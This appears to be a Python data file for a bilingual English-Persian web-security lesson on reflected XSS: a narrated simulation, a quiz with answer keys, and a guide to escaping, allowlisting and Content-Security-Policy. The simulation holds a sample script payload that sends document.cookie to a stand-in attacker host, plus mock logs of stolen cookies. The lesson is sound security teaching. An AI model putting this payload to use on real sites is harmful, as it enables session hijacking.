LESSON = {
    "slug": "reflected-xss",
    "title": "Reflected XSS",
    "summary": "Learn how attackers can inject JavaScript through reflected request data.",
    "difficulty": "beginner",
    "sort_order": 4,
    "estimated_minutes": 15,
    "simulation_key": "reflected-xss",
    "required_locales": ("fa", "en"),
    "guide_path": "/lessons/reflected-xss-guide",
    "quiz_path": "/lessons/reflected-xss-quiz",
    "quiz_start_path": "/lessons/reflected-xss-quiz-start",
    "lessons_path": "/lessons",
    "total_steps": 14,
    "final_step": 13,
    "steps": [
        [{"type": "text", "text": "Previously we saw how some cross-site scripting (XSS) vulnerabilities allow attackers to store malicious JavaScript in your database, which will be executed when other users view your site."}],
        [{"type": "text", "text": "There is another way attackers can use XSS to inject malicious JavaScript, called a reflected XSS attack."}],
        [
            {"type": "text", "text": "If your website takes any part of the HTTP request from a user and displays it back to them, you could be enabling another vector by which a malicious third-party could inject JavaScript."},
            {"type": "break"},
            {"type": "strong", "text": "Let's see how."},
        ],
        [{"type": "strong", "text": "Mal"}, {"type": "text", "text": " is a hacker who has noticed that your site's search function passes search terms in the URL."}],
        [{"type": "text", "text": "He knows the search terms in the URL will get displayed back on the search results page, and he wonders if they are escaped properly."}],
        [{"type": "text", "text": "To test this, he crafts a URL with a snippet of JavaScript in the search parameter."}],
        [{"type": "text", "text": "Sure enough, when he drops the URL in his browser, the injected JavaScript is executed and the browser redirects to his malicious site."}],
        [{"type": "strong", "text": "The victim"}, {"type": "break"}, {"type": "text", "text": "Now he has to trick someone into navigating to that URL. Someone like "}, {"type": "strong", "text": "Vic"}, {"type": "text", "text": "."}],
        [{"type": "strong", "text": "The victim"}, {"type": "break"}, {"type": "text", "text": "Mal sends Vic an email with a very tempting link, pointing at the crafted URL."}],
        [{"type": "strong", "text": "The victim"}, {"type": "break"}, {"type": "text", "text": "Vic clicks on the link. The page renders the search parameter in the HTML without escaping it properly, which creates a new "}, {"type": "code", "text": "<script>"}, {"type": "text", "text": " tag in the browser."}],
        [{"type": "strong", "text": "The victim"}, {"type": "break"}, {"type": "text", "text": "The script is executed immediately when the page loads..."}],
        [{"type": "strong", "text": "The victim"}, {"type": "break"}, {"type": "text", "text": "...and Vic gets redirected to Mal's malicious website."}],
        [{"type": "text", "text": "Mal can now check his server log and hijack Vic's session, since the malicious redirect passed his session ID in the URL."}],
        [{"type": "strong", "text": "Phew."}, {"type": "text", "text": " Now we know how "}, {"type": "strong", "text": "reflected XSS"}, {"type": "text", "text": " attacks work, let's learn how to protect against them."}],
    ],
    "completion": [{"type": "strong", "text": "Phew."}, {"type": "text", "text": " Now we know how "}, {"type": "strong", "text": "reflected XSS"}, {"type": "text", "text": " attacks work."}],
    "simulation": {
        "site": {
            "name": "welp",
            "url": "www.welp.com",
            "tagline": "The indifferent restaurant review site",
            "empty_message": "I guess you should search for food or something.",
            "placeholder": "Enter your search...",
            "safe_query": "taco",
            "attack_query": "&lt;script&gt;window.location='www.haxxed.com?cookie='+document.cookie&lt;/script&gt;",
            "payload_url": "www.welp.com?search=&lt;script&gt;window.location='www.haxxed.com?cookie='+document.cookie&lt;/script&gt;",
            "results_title": 'Search results for "taco"',
            "results": [
                {"name": "Dynamite Taco", "rating": 3, "description": "This place sells tacos, I reckon."},
                {"name": "Tacos Deluxe", "rating": 3, "description": "Yup. Tacos here too."},
            ],
        },
        "email": {"url": "email.com", "subject": "Free Tacos, every Tuesday", "to": "Vic", "button": "LIMITED TIME OFFER - CLICK HERE"},
        "labels": {"victim": "The victim"},
        "hacked": {"title": "Session redirected", "host": "www.haxxed.com", "message": "Vic's browser has been sent to Mal's malicious site.", "cookie_label": "stolen cookie"},
        "logs": {
            "header": "output.log",
            "lines": [
                "www.haxxed.com?cookie=asdfefefffasdfCsdfnEfefffasdfnEf",
                "www.haxxed.com?cookie=gkelfeniAnlJreklfNkleniAnlJrNkle",
                "www.haxxed.com?cookie=SneklfjsdkleekflaAnefjsdkleeAnef",
                "www.haxxed.com?cookie=asFFEfn222fefeknladffn222fefadff",
                "www.haxxed.com?cookie=ffasdasdfefeffCsdfnEasdfefeffnEa",
                "www.haxxed.com?cookie=engkelfiAnlJreklfNkllfiAnlJrNkll",
                "www.haxxed.com?cookie=22fefeSneklfjsdkleekeSneklfjeeke",
                "www.haxxed.com?cookie=flaAneasFFEfn2knladfeasFFEfnadfe",
                "www.haxxed.com?cookie=fffasdfCasdfefesdfnEdfCasdfefnEd",
                "www.haxxed.com?cookie=iAnlJrengkelfeklfNklrengkelfNklr",
                "www.haxxed.com?cookie=leekfSneklfjsdklaAneSneklfjsAneS",
                "www.haxxed.com?cookie=fn222feasFFEfeknladffeasFFEfadff",
            ],
        },
        "scenes": {
            "3": {"actor": "mal", "type": "welp-home"},
            "4": {"actor": "mal", "type": "welp-results"},
            "5": {"actor": "mal", "type": "payload-craft"},
            "6": {"actor": "mal", "type": "hacked"},
            "7": {"actor": "vic", "type": "victim-intro"},
            "8": {"actor": "vic", "type": "email-trap"},
            "9": {"actor": "vic", "type": "victim-click"},
            "10": {"actor": "vic", "type": "victim-click"},
            "11": {"actor": "vic", "type": "victim-hacked"},
            "12": {"actor": "mal", "type": "server-log"},
        },
    },
    "quiz_intro": {
        "eyebrow": "Test your knowledge",
        "icon": "🧠",
        "title": "Quiz: Reflected XSS",
        "summary": "Take this quick quiz to show you were paying attention.",
        "start_button": "Start the quiz",
        "review_button": "Review the material one more time →",
    },
    "quiz": {
        "title": "Reflected XSS quiz",
        "instructions": "Take this quick quiz to show you were paying attention.",
        "pass_percentage": 100,
        "shuffle_questions": False,
        "shuffle_answers": False,
        "questions": [
            {
                "key": "stored-vs-reflected-danger",
                "type": "single",
                "prompt": "Which is more dangerous: stored or reflected XSS attacks?",
                "answers": [
                    {"key": "stored", "text": "Stored XSS attacks", "is_correct": True},
                    {"key": "reflected", "text": "Reflected XSS attacks", "is_correct": False},
                ],
            },
            {
                "key": "reflected-xss-page-types",
                "type": "single",
                "prompt": "What kinds of pages are likely to contain reflected XSS vulnerabilities?",
                "answers": [
                    {"key": "request-echo-pages", "text": "Pages that display request input back to the user", "is_correct": True},
                    {"key": "database-only-pages", "text": "Only pages that save data to the database", "is_correct": False},
                    {"key": "static-assets", "text": "Static image, CSS, and font files", "is_correct": False},
                    {"key": "admin-only-pages", "text": "Only private admin pages with no user input", "is_correct": False},
                ],
            },
            {
                "key": "database-only-review-scope",
                "type": "single",
                "prompt": "True or False: you only really need to check pages that interact with your database for vulnerabilities.",
                "answers": [
                    {"key": "false", "text": "False", "is_correct": True},
                    {"key": "true", "text": "True", "is_correct": False},
                ],
            }
        ],
    },
}


FA_LESSON = {
    **LESSON,
    "steps": [
        [{"type": "text", "text": "قبلاً دیدیم بعضی آسیب‌پذیری‌های XSS به مهاجم اجازه می‌دهند JavaScript مخرب را در پایگاه‌داده‌ی شما ذخیره کند؛ کدی که وقتی کاربران دیگر سایت را می‌بینند اجرا می‌شود."}],
        [{"type": "text", "text": "راه دیگری هم هست که مهاجمان با آن می‌توانند از XSS برای تزریق JavaScript مخرب استفاده کنند؛ به آن حمله‌ی XSS بازتابی می‌گویند."}],
        [
            {"type": "text", "text": "اگر وب‌سایت شما بخشی از درخواست HTTP کاربر را بگیرد و همان را دوباره در صفحه به او نمایش دهد، ممکن است ناخواسته یک مسیر دیگر برای تزریق JavaScript توسط یک شخص ثالث مخرب باز کرده باشید."},
            {"type": "break"},
            {"type": "strong", "text": "بیایید ببینیم چطور."},
        ],
        [{"type": "strong", "text": "Mal"}, {"type": "text", "text": " هکری است که متوجه شده قابلیت جست‌وجوی سایت شما عبارت‌های جست‌وجو را داخل URL می‌فرستد."}],
        [{"type": "text", "text": "او می‌داند عبارت جست‌وجو از داخل URL در صفحه‌ی نتایج دوباره نمایش داده می‌شود، و کنجکاو است ببیند آیا کاراکترهای خطرناک درست بی‌اثر شده‌اند یا نه."}],
        [{"type": "text", "text": "برای آزمایش، یک URL می‌سازد که داخل پارامتر جست‌وجو یک تکه کد JavaScript دارد."}],
        [{"type": "text", "text": "همان‌طور که حدس می‌زد، وقتی URL را در مرورگر باز می‌کند، JavaScript تزریق‌شده اجرا می‌شود و مرورگر به سایت مخرب او منتقل می‌شود."}],
        [{"type": "strong", "text": "قربانی"}, {"type": "break"}, {"type": "text", "text": "حالا باید کسی را فریب بدهد تا آن URL را باز کند. کسی مثل "}, {"type": "strong", "text": "Vic"}, {"type": "text", "text": "."}],
        [{"type": "strong", "text": "قربانی"}, {"type": "break"}, {"type": "text", "text": "Mal برای Vic ایمیلی با یک لینک وسوسه‌کننده می‌فرستد؛ لینکی که به همان URL دستکاری‌شده اشاره می‌کند."}],
        [{"type": "strong", "text": "قربانی"}, {"type": "break"}, {"type": "text", "text": "Vic روی لینک کلیک می‌کند. صفحه پارامتر جست‌وجو را بدون escape درست داخل HTML رندر می‌کند و همین باعث می‌شود یک تگ "}, {"type": "code", "text": "<script>"}, {"type": "text", "text": " جدید در مرورگر ساخته شود."}],
        [{"type": "strong", "text": "قربانی"}, {"type": "break"}, {"type": "text", "text": "اسکریپت بلافاصله هنگام بارگذاری صفحه اجرا می‌شود..."}],
        [{"type": "strong", "text": "قربانی"}, {"type": "break"}, {"type": "text", "text": "...و Vic به وب‌سایت مخرب Mal منتقل می‌شود."}],
        [{"type": "text", "text": "حالا Mal می‌تواند لاگ سرورش را بررسی کند و نشست Vic را بدزدد، چون ریدایرکت مخرب شناسه‌ی نشست او را داخل URL فرستاده است."}],
        [{"type": "strong", "text": "خب."}, {"type": "text", "text": " حالا که فهمیدیم حملات "}, {"type": "strong", "text": "XSS بازتابی"}, {"type": "text", "text": " چطور کار می‌کنند، بیایید یاد بگیریم چطور جلویشان را بگیریم."}],
    ],
    "completion": [{"type": "strong", "text": "خب."}, {"type": "text", "text": " حالا که فهمیدیم حملات "}, {"type": "strong", "text": "XSS بازتابی"}, {"type": "text", "text": " چطور کار می‌کنند."}],
    "quiz_intro": {
        "eyebrow": "دانشت را بسنج",
        "icon": "🧠",
        "title": "آزمون: XSS بازتابی",
        "summary": "با این آزمون کوتاه مطمئن شو نکته‌های اصلی را خوب گرفته‌ای.",
        "start_button": "شروع آزمون",
        "review_button": "یک بار دیگر مطالب را مرور کن ←",
    },
    "quiz": {
        **LESSON["quiz"],
        "title": "آزمون: XSS بازتابی",
        "instructions": "با این آزمون کوتاه مطمئن شو نکته‌های اصلی را خوب گرفته‌ای.",
        "questions": [
            {
                **LESSON["quiz"]["questions"][0],
                "prompt": "کدام نوع حمله خطرناک‌تر است: XSS ذخیره‌شده یا XSS بازتابی؟",
                "answers": [
                    {
                        **LESSON["quiz"]["questions"][0]["answers"][0],
                        "text": "حملات XSS ذخیره‌شده",
                    },
                    {
                        **LESSON["quiz"]["questions"][0]["answers"][1],
                        "text": "حملات XSS بازتابی",
                    },
                ],
            },
            {
                **LESSON["quiz"]["questions"][1],
                "prompt": "چه نوع صفحه‌هایی بیشتر ممکن است آسیب‌پذیری XSS بازتابی داشته باشند؟",
                "answers": [
                    {
                        **LESSON["quiz"]["questions"][1]["answers"][0],
                        "text": "صفحه‌هایی که ورودی درخواست کاربر را دوباره به او نمایش می‌دهند",
                    },
                    {
                        **LESSON["quiz"]["questions"][1]["answers"][1],
                        "text": "فقط صفحه‌هایی که داده را در پایگاه‌داده ذخیره می‌کنند",
                    },
                    {
                        **LESSON["quiz"]["questions"][1]["answers"][2],
                        "text": "فایل‌های ثابت مثل تصویر، CSS و فونت",
                    },
                    {
                        **LESSON["quiz"]["questions"][1]["answers"][3],
                        "text": "فقط صفحه‌های مدیریتی خصوصی که هیچ ورودی کاربر ندارند",
                    },
                ],
            },
            {
                **LESSON["quiz"]["questions"][2],
                "prompt": "درست یا نادرست: فقط لازم است صفحه‌هایی را از نظر آسیب‌پذیری بررسی کنیم که با پایگاه‌داده ارتباط دارند.",
                "answers": [
                    {
                        **LESSON["quiz"]["questions"][2]["answers"][0],
                        "text": "نادرست",
                    },
                    {
                        **LESSON["quiz"]["questions"][2]["answers"][1],
                        "text": "درست",
                    },
                ],
            },
        ],
    },
}


GUIDE = {
    "overview": {
        "title": "Reflected XSS",
        "metrics": [
            {"label": "Prevalence", "value": "Common", "icon": "📊", "tone": "orange"},
            {"label": "Exploitability", "value": "Easy", "icon": "💣", "tone": "red"},
            {"label": "Impact", "value": "Harmful", "icon": "🔥", "tone": "rose"},
        ],
        "paragraphs": [
            [{"type": "strong", "text": "Cross-site scripting"}, {"type": "text", "text": " (XSS) is one the most common ways hackers attack websites. XSS vulnerabilities permit a malicious user to execute arbitrary chunks of JavaScript when other users visit your site."}],
            [{"type": "strong", "text": "XSS is the most common publicly reported security vulnerability, and part of every hacker's toolkit."}],
        ],
    },
    "risks": {
        "title": "Risks",
        "icon": "⚠️",
        "paragraphs": [
            [{"type": "text", "text": "Reflected XSS attacks are less dangerous than "}, {"type": "link", "text": "stored XSS attacks"}, {"type": "text", "text": ", which cause a persistent problem when users visit a particular page, "}, {"type": "highlight", "text": "but are much more common"}, {"type": "text", "text": ". Any page that takes a parameter from a GET or POST request and displays that parameter back to the user in some fashion is potentially at risk. A page that fails to treat query string parameters as untrusted content can allow the construction of malicious URLs. An attacker will spread these malicious URLs in emails, in comments sections, or in forums. Since the link points at a site the user trusts, they are much more likely to click on it, not knowing the harm that it will do."}],
            [{"type": "text", "text": "Reflected XSS vulnerabilities are easy to overlook in your code reviews, since the temptation is to only check code that interacts with the data store. Be particularly careful to check the following types of pages:"}],
        ],
        "bullets": [
            {"heading": "Search results", "text": "does the search criteria get displayed back to the user? Is it written out in the page title? Are you sure it is being escaped properly?"},
            {"heading": "Error pages", "text": "if you have error messages that complain about invalid inputs, does the input get escaped properly when it is displayed back to the user? Does your 404 page mention the path being searched for?"},
            {"heading": "Form submissions", "text": "if a page POSTs data, does any part of the data being submitted by the form get displayed back to the user? What if the form submission is rejected -- does the error page allow injection of malicious code? Does an erroneously submitted form get pre-populated with the values previously submitted?"},
        ],
        "closing": [[{"type": "text", "text": "Our "}, {"type": "link", "text": "example hack"}, {"type": "text", "text": " demonstrated a maliciously crafted GET request. However, POST requests should be treated with similar caution. If you don't protect against "}, {"type": "link", "text": "cross-site request forgery"}, {"type": "text", "text": ", attackers can easily construct malicious POST requests. And even if you "}, {"type": "em", "text": "do"}, {"type": "text", "text": " protect against CSRF, attackers will often use a combination of vulnerabilities to construct poisoned POST requests."}]],
    },
    "protection": {
        "title": "Protection",
        "icon": "🔒",
        "intro": [
            [{"type": "text", "text": "To protect against reflected XSS attacks, make sure that any dynamic content coming from the HTTP request cannot be used to inject JavaScript on a page."}],
            [{"type": "strong", "text": "Be sure to check all pages on your site, whether they write to the data store or not!"}],
        ],
        "sections": [
            {
                "heading": "Escape Dynamic Content",
                "paragraphs": [
                    [{"type": "text", "text": "Web pages are made up of HTML, usually described in template files, with dynamic content woven in when the page is rendered. Stored XSS attacks make use of the improper treatment of dynamic content coming from a backend data store. The attacker abuses an editable field to insert some JavaScript code, and it is evaluated on page load."}],
                    [{"type": "text", "text": "Unless your site is a content-management system, it is rare that you want your users to author raw HTML. Instead, you should "}, {"type": "strong", "text": "escape"}, {"type": "text", "text": " all dynamic content coming from a data store, so the browser knows it is to be treated as the "}, {"type": "em", "text": "contents"}, {"type": "text", "text": " of HTML tags, as opposed to raw HTML."}],
                    [{"type": "text", "text": "Escaping dynamic contents generally consists of replacing significant characters with the HTML entity encoding:"}],
                ],
                "table": {"headings": ["Character", "Encoding"], "rows": [["<", "&#60"], [">", "&#62"], ["&", "&#38"], ['"', "&#34"], ["'", "&#39"]]},
                "after_table": [
                    [{"type": "text", "text": "Most modern frameworks will escape dynamic content by default -- see the "}, {"type": "link", "text": "cross-site scripting exercise"}, {"type": "text", "text": " for details."}],
                    [{"type": "text", "text": "Be even more careful if untrusted content is being inserted into "}, {"type": "code", "text": "<script>"}, {"type": "text", "text": " or "}, {"type": "code", "text": "<style>"}, {"type": "text", "text": " tags on a page. Escaping in these scenarios needs special consideration, and if your choice of tools doesn't have stylesheet and script encoding available by default, consider using a "}, {"type": "link", "text": "dedicated tool"}, {"type": "text", "text": "."}],
                ],
            },
            {"heading": "Allowlist Values", "paragraphs": [[{"type": "text", "text": "If a particular dynamic data item can only take a handful of valid values, the best practice is to restrict the values in the data store, and have your rendering logic only permit known good values. If a URL expects a \"country\" parameter in the URL, for instance, make sure it is only permitted to take on one of a list of valid enumerated values."}]]},
            {
                "heading": "Implement a Content-Security Policy",
                "paragraphs": [
                    [{"type": "text", "text": "Browsers support Content-Security Policies that allow the author of a web-page to control where JavaScript ("}, {"type": "link", "text": "and other resources"}, {"type": "text", "text": ") can be loaded and executed from. XSS attacks rely on the attacker being able to run malicious scripts on a user's web page - either by injecting inline "}, {"type": "code", "text": "<script>"}, {"type": "text", "text": " tags somewhere within the "}, {"type": "code", "text": "<html>"}, {"type": "text", "text": " tag of a page, or by tricking the browser into loading the JavaScript from a malicious third-party domain."}],
                    [{"type": "text", "text": "By setting a content security policy in the response header, you can tell the browser to "}, {"type": "em", "text": "never"}, {"type": "text", "text": " execute inline JavaScript, and to lock down which domains can host JavaScript for a page:"}],
                ],
                "terminal": "Content-Security-Policy: script-src 'self' https://apis.google.com",
                "after_terminal": [
                    [{"type": "strong", "text": "By listing the URLs from which scripts can be loaded, you are implicitly stating that inline JavaScript is not allowed."}],
                    [{"type": "text", "text": "The content security policy can also be set in a "}, {"type": "code", "text": "<meta>"}, {"type": "text", "text": " tag in the "}, {"type": "code", "text": "<head>"}, {"type": "text", "text": " element of the page:"}],
                ],
                "second_terminal": "<meta http-equiv=\"Content-Security-Policy\"\n      content=\"script-src 'self' https://apis.google.com\">",
                "closing": [
                    [{"type": "strong", "text": "This approach will protect your users very effectively!"}, {"type": "text", "text": " However, it may take a considerable amount of discipline to make your site ready for such a header. Inline scripts tags are considered bad practice in modern web-development - mixing content and code makes web-applications difficult to maintain - but are common in older, legacy sites."}],
                    [{"type": "text", "text": "To migrate away from inline scripts incrementally, consider making use of "}, {"type": "link", "text": "CSP Violation Reports"}, {"type": "text", "text": ". By adding a "}, {"type": "code", "text": "report-to"}, {"type": "text", "text": " directive in your policy header, the browser will notify you of any policy violations, rather than preventing inline JavaScript from executing:"}],
                ],
                "third_terminal": "Reporting-Endpoints: csp-endpoint=\"https://example.com/csp-reports\"\nContent-Security-Policy-Report-Only: script-src 'self'; report-to csp-endpoint",
                "final_paragraph": "This will give you reassurance that there are no lingering inline scripts, before you ban them outright.",
            },
        ],
    },
    "quiz_cta": {"eyebrow": "Got it?", "icon": "✏️", "label": "Quiz:", "title": "Reflected XSS", "summary": "Take a quick quiz to show you were paying attention →", "path": "/lessons/reflected-xss-quiz"},
}


FA_GUIDE = {
    **GUIDE,
    "overview": {
        "title": "XSS بازتابی",
        "metrics": [
            {"label": "چقدر رایج است", "value": "رایج", "icon": "📊", "tone": "orange"},
            {"label": "سوءاستفاده از آن", "value": "آسان", "icon": "💣", "tone": "red"},
            {"label": "اثر حمله", "value": "زیان‌بار", "icon": "🔥", "tone": "rose"},
        ],
        "paragraphs": [
            [
                {"type": "strong", "text": "Cross-site scripting یا XSS"},
                {"type": "text", "text": " یکی از رایج‌ترین روش‌هایی است که مهاجمان برای حمله به وب‌سایت‌ها استفاده می‌کنند. آسیب‌پذیری‌های XSS به کاربر مخرب اجازه می‌دهند وقتی کاربران دیگر از سایت بازدید می‌کنند، تکه‌هایی از JavaScript دلخواه را در مرورگر آن‌ها اجرا کند."},
            ],
            [
                {"type": "strong", "text": "XSS یکی از رایج‌ترین آسیب‌پذیری‌های امنیتی گزارش‌شده به‌صورت عمومی است و تقریباً در جعبه‌ابزار هر مهاجمی پیدا می‌شود."},
            ],
        ],
    },
    "risks": {
        "title": "ریسک‌ها",
        "icon": "⚠️",
        "paragraphs": [
            [
                {"type": "text", "text": "حملات XSS بازتابی از "},
                {"type": "link", "text": "حملات XSS ذخیره‌شده"},
                {"type": "text", "text": " کم‌خطرترند، چون مشکل دائمی روی یک صفحه ایجاد نمی‌کنند، "},
                {"type": "highlight", "text": "اما خیلی رایج‌تر هستند"},
                {"type": "text", "text": ". هر صفحه‌ای که پارامتری را از درخواست GET یا POST بگیرد و به هر شکلی همان را به کاربر نمایش دهد، می‌تواند در معرض خطر باشد. اگر صفحه با پارامترهای query string مثل محتوای غیرقابل‌اعتماد برخورد نکند، مهاجم می‌تواند URLهای مخرب بسازد. این URLها معمولاً از راه ایمیل، بخش دیدگاه‌ها یا انجمن‌ها پخش می‌شوند. چون لینک به سایتی اشاره می‌کند که کاربر به آن اعتماد دارد، احتمال کلیک‌کردن روی آن زیاد است؛ بدون اینکه کاربر بداند چه آسیبی در راه است."},
            ],
            [
                {"type": "text", "text": "آسیب‌پذیری‌های XSS بازتابی در بازبینی کد به‌راحتی نادیده گرفته می‌شوند، چون معمولاً وسوسه می‌شویم فقط کدی را بررسی کنیم که با پایگاه‌داده کار دارد. مخصوصاً این نوع صفحه‌ها را با دقت بررسی کن:"},
            ],
        ],
        "bullets": [
            {"heading": "نتایج جست‌وجو", "text": "آیا عبارت جست‌وجو دوباره به کاربر نمایش داده می‌شود؟ آیا داخل عنوان صفحه نوشته می‌شود؟ مطمئنی درست escape شده است؟"},
            {"heading": "صفحه‌های خطا", "text": "اگر پیام خطا درباره ورودی نامعتبر نمایش می‌دهی، آیا همان ورودی هنگام نمایش به کاربر درست escape می‌شود؟ آیا صفحه 404 مسیر جست‌وجوشده را نشان می‌دهد؟"},
            {"heading": "ارسال فرم‌ها", "text": "اگر صفحه‌ای داده را با POST ارسال می‌کند، آیا بخشی از اطلاعات ارسال‌شده دوباره به کاربر نمایش داده می‌شود؟ اگر ارسال فرم رد شود چه؟ آیا صفحه خطا اجازه تزریق کد مخرب می‌دهد؟ آیا فرم ناموفق با همان مقدارهای قبلی دوباره پر می‌شود؟"},
        ],
        "closing": [
            [
                {"type": "text", "text": "در "},
                {"type": "link", "text": "نمونه حمله"},
                {"type": "text", "text": " دیدیم که یک درخواست GET دستکاری‌شده چطور می‌تواند خطرناک باشد. اما درخواست‌های POST هم باید با همین دقت بررسی شوند. اگر در برابر "},
                {"type": "link", "text": "cross-site request forgery"},
                {"type": "text", "text": " محافظت نداشته باشی، مهاجمان می‌توانند درخواست‌های POST مخرب بسازند. حتی اگر در برابر CSRF هم محافظت داشته باشی، مهاجمان اغلب چند آسیب‌پذیری را ترکیب می‌کنند تا درخواست POST آلوده بسازند."},
            ]
        ],
    },
    "protection": {
        "title": "محافظت",
        "icon": "🔒",
        "intro": [
            [
                {"type": "text", "text": "برای محافظت در برابر XSS بازتابی، مطمئن شو هیچ محتوای پویایی که از درخواست HTTP می‌آید نتواند برای تزریق JavaScript داخل صفحه استفاده شود."},
            ],
            [
                {"type": "strong", "text": "همه صفحه‌های سایت را بررسی کن؛ چه با پایگاه‌داده کار کنند، چه نکنند."},
            ],
        ],
        "sections": [
            {
                "heading": "Escape کردن محتوای پویا",
                "paragraphs": [
                    [
                        {"type": "text", "text": "صفحه‌های وب از HTML ساخته می‌شوند و معمولاً در فایل‌های template تعریف می‌شوند. هنگام رندر شدن صفحه، محتوای پویا داخل این templateها قرار می‌گیرد. در XSS ذخیره‌شده، مشکل از برخورد نادرست با محتوای پویایی می‌آید که از پایگاه‌داده خوانده می‌شود؛ مهاجم یک فیلد قابل ویرایش را با JavaScript پر می‌کند و کد هنگام بارگذاری صفحه اجرا می‌شود."},
                    ],
                    [
                        {"type": "text", "text": "اگر سایت تو یک سیستم مدیریت محتوا نیست، معمولاً دلیلی ندارد کاربران بتوانند HTML خام بنویسند. بهتر است همه محتوای پویا را "},
                        {"type": "strong", "text": "escape"},
                        {"type": "text", "text": " کنی تا مرورگر آن را به‌عنوان "},
                        {"type": "em", "text": "محتوای"},
                        {"type": "text", "text": " تگ‌های HTML تفسیر کند، نه HTML خام."},
                    ],
                    [
                        {"type": "text", "text": "Escape کردن محتوا معمولاً یعنی کاراکترهای مهم را با entityهای HTML جایگزین کنیم:"},
                    ],
                ],
                "table": {"headings": ["کاراکتر", "کدگذاری"], "rows": [["<", "&#60"], [">", "&#62"], ["&", "&#38"], ['"', "&#34"], ["'", "&#39"]]},
                "after_table": [
                    [
                        {"type": "text", "text": "بیشتر فریم‌ورک‌های مدرن محتوای پویا را به‌صورت پیش‌فرض escape می‌کنند؛ برای جزئیات بیشتر درس "},
                        {"type": "link", "text": "Cross-site scripting"},
                        {"type": "text", "text": " را ببین."},
                    ],
                    [
                        {"type": "text", "text": "اگر محتوای غیرقابل‌اعتماد داخل تگ‌های "},
                        {"type": "code", "text": "<script>"},
                        {"type": "text", "text": " یا "},
                        {"type": "code", "text": "<style>"},
                        {"type": "text", "text": " قرار می‌گیرد، باید حتی بیشتر مراقب باشی. Escape کردن در این حالت‌ها قواعد خاص خودش را دارد. اگر ابزار یا فریم‌ورکت کدگذاری مخصوص stylesheet و script را به‌صورت پیش‌فرض ندارد، بهتر است از یک "},
                        {"type": "link", "text": "ابزار اختصاصی"},
                        {"type": "text", "text": " استفاده کنی."},
                    ],
                ],
            },
            {
                "heading": "مقدارهای مجاز را محدود کن",
                "paragraphs": [
                    [
                        {"type": "text", "text": "اگر یک داده پویا فقط می‌تواند چند مقدار مشخص و معتبر داشته باشد، بهترین کار این است که مقدارهای مجاز را محدود کنی و منطق رندر صفحه فقط همان مقدارهای شناخته‌شده و امن را بپذیرد. مثلاً اگر URL یک پارامتر به نام country می‌گیرد، مطمئن شو فقط یکی از مقدارهای مجاز و از قبل تعریف‌شده را قبول می‌کند."},
                    ]
                ],
            },
            {
                "heading": "Content-Security Policy پیاده‌سازی کن",
                "paragraphs": [
                    [
                        {"type": "text", "text": "مرورگرها از Content-Security Policy پشتیبانی می‌کنند؛ قابلیتی که به سازنده صفحه اجازه می‌دهد کنترل کند JavaScript و "},
                        {"type": "link", "text": "منابع دیگر"},
                        {"type": "text", "text": " از چه دامنه‌هایی بارگذاری و اجرا شوند. حملات XSS معمولاً به این وابسته‌اند که مهاجم بتواند اسکریپت مخرب را در صفحه کاربر اجرا کند؛ یا با تزریق تگ "},
                        {"type": "code", "text": "<script>"},
                        {"type": "text", "text": " داخل تگ "},
                        {"type": "code", "text": "<html>"},
                        {"type": "text", "text": " صفحه، یا با مجبور کردن مرورگر به بارگذاری JavaScript از یک دامنه مخرب بیرونی."},
                    ],
                    [
                        {"type": "text", "text": "با تنظیم Content-Security Policy در هدر پاسخ، می‌توانی به مرورگر بگویی JavaScript inline را "},
                        {"type": "em", "text": "هرگز"},
                        {"type": "text", "text": " اجرا نکند و فقط از دامنه‌های مشخص‌شده JavaScript بارگذاری کند:"},
                    ],
                ],
                "terminal": GUIDE["protection"]["sections"][2]["terminal"],
                "after_terminal": [
                    [
                        {"type": "strong", "text": "وقتی URLهایی را که اجازه بارگذاری script دارند مشخص می‌کنی، در عمل می‌گویی JavaScript inline مجاز نیست."},
                    ],
                    [
                        {"type": "text", "text": "Content-Security Policy را می‌توان داخل تگ "},
                        {"type": "code", "text": "<meta>"},
                        {"type": "text", "text": " در بخش "},
                        {"type": "code", "text": "<head>"},
                        {"type": "text", "text": " صفحه هم تنظیم کرد:"},
                    ],
                ],
                "second_terminal": GUIDE["protection"]["sections"][2]["second_terminal"],
                "closing": [
                    [
                        {"type": "strong", "text": "این روش از کاربران تو خیلی خوب محافظت می‌کند!"},
                        {"type": "text", "text": " البته آماده‌کردن سایت برای چنین هدرهایی ممکن است کمی نظم و بازبینی بخواهد. تگ‌های script inline در توسعه وب مدرن عادت خوبی نیستند، چون محتوا و کد را قاطی می‌کنند و نگهداری برنامه را سخت‌تر می‌کنند؛ با این حال در سایت‌های قدیمی زیاد دیده می‌شوند."},
                    ],
                    [
                        {"type": "text", "text": "برای مهاجرت مرحله‌به‌مرحله از scriptهای inline، می‌توانی از "},
                        {"type": "link", "text": "گزارش‌های نقض CSP"},
                        {"type": "text", "text": " استفاده کنی. با اضافه کردن directive به نام "},
                        {"type": "code", "text": "report-to"},
                        {"type": "text", "text": " در policy header، مرورگر به‌جای اینکه اجرای JavaScript inline را فوراً مسدود کند، نقض policyها را به تو گزارش می‌دهد:"},
                    ],
                ],
                "third_terminal": GUIDE["protection"]["sections"][2]["third_terminal"],
                "final_paragraph": "این کار به تو اطمینان می‌دهد قبل از ممنوع‌کردن کامل scriptهای inline، مورد باقی‌مانده‌ای در سایت جا نمانده است.",
            },
        ],
    },
    "quiz_cta": {
        "eyebrow": "یاد گرفتی؟",
        "icon": "✏️",
        "label": "آزمون:",
        "title": "XSS بازتابی",
        "summary": "با یک آزمون کوتاه مطمئن شو نکته‌های اصلی را گرفته‌ای ←",
        "path": "/lessons/reflected-xss-quiz",
    },
}


LESSON_TRANSLATIONS = {
    "en": LESSON,
    "fa": FA_LESSON,
}
GUIDE_TRANSLATIONS = {
    "en": GUIDE,
    "fa": FA_GUIDE,
}


def inline_plain_text(parts):
    chunks = []
    for part in parts:
        if part.get("type") == "break":
            chunks.append("\n")
        else:
            chunks.append(part.get("text", ""))
    return "".join(chunks)
